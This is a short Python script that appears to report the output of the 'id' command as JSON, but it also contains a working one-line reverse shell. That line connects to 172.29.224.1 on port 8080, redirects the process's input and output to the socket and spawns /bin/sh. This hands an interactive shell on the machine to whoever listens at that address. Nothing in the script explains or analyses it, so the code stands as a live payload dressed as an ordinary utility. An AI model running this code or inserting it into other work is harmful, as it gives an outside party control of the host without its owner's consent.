import json
import os



import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.29.224.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")


stream = os.popen('id')
output = stream.read()
result = {"result": output}
result = json.dumps(result)

print(result)
